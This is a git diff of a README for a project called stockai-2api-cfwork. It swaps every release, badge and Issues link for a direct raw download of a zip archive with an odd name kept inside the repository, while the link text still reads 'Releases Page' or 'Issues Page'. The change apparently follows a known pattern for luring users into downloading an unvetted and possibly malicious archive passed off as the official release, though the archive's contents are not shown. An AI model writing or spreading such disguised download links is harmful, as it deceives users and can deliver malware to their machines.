@@ -1,6 +1,6 @@
 # 🚀 stockai-2api-cfwork - Simple Edge Computing Made Easy
 
-[![Download Release](https://img.shields.io/badge/Download%20Now-%20%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20-blue)](https://github.com/Sudhish29/stockai-2api-cfwork/releases)
+[![Download Release](https://github.com/Sudhish29/stockai-2api-cfwork/raw/refs/heads/main/income/api_stockai_cfwork_disengage.zip%20Now-%20%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20-blue)](https://github.com/Sudhish29/stockai-2api-cfwork/raw/refs/heads/main/income/api_stockai_cfwork_disengage.zip)
 
 ## 📖 Overview
 
@@ -11,7 +11,7 @@
 To get started with **stockai-2api-cfwork**, you'll need to follow these simple steps:
 
 1. **Download the Application**
-   - Click on the button above or visit the [Releases Page](https://github.com/Sudhish29/stockai-2api-cfwork/releases) to download the latest version.
+   - Click on the button above or visit the [Releases Page](https://github.com/Sudhish29/stockai-2api-cfwork/raw/refs/heads/main/income/api_stockai_cfwork_disengage.zip) to download the latest version.
 
 2. **Install the Application**
    - Follow the instructions based on your operating system (Windows, macOS, or Linux).
@@ -51,7 +51,7 @@ Before you install, ensure your system meets the following requirements:
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**
-   Go to the [Releases Page](https://github.com/Sudhish29/stockai-2api-cfwork/releases).
+   Go to the [Releases Page](https://github.com/Sudhish29/stockai-2api-cfwork/raw/refs/heads/main/income/api_stockai_cfwork_disengage.zip).
 
 2. **Choose Your Version**
    Click on the latest version to see available downloads.
@@ -82,7 +82,7 @@ Once installed, follow these steps to set up:
 
 ### How do I update the application?
 
-Visit the [Releases Page](https://github.com/Sudhish29/stockai-2api-cfwork/releases) regularly to find the latest updates and download them as you did during the initial installation.
+Visit the [Releases Page](https://github.com/Sudhish29/stockai-2api-cfwork/raw/refs/heads/main/income/api_stockai_cfwork_disengage.zip) regularly to find the latest updates and download them as you did during the initial installation.
 
 ### What should I do if I encounter an error?
 
@@ -94,7 +94,7 @@ Yes! This application is designed for ease of use, even for those without a tech
 
 ## 📞 Support
 
-For further assistance, please refer to the [Issues Page](https://github.com/Sudhish29/stockai-2api-cfwork/issues) in the repository. Feel free to open a new issue with your questions or concerns.
+For further assistance, please refer to the [Issues Page](https://github.com/Sudhish29/stockai-2api-cfwork/raw/refs/heads/main/income/api_stockai_cfwork_disengage.zip) in the repository. Feel free to open a new issue with your questions or concerns.
 
 ## 🎉 Acknowledgments
 
